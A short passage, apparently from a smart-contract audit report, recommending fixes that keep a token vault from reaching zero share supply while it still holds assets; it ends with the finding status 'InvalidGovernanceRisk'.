Do not allow the vault to reach zero supply while it still holds asset tokens. For example, after withdrawals require `totalSupply() == 0` only when `IERC20(asset()).balanceOf(address(this)) == 0`, or disallow full redemption while rewards are unvested. A more robust fix is to permanently lock/burn initial seed shares or add an admin-only recovery/reseed path for `asset()` that is callable only when `totalSupply() == 0`.





Finding Status: InvalidGovernanceRisk
```
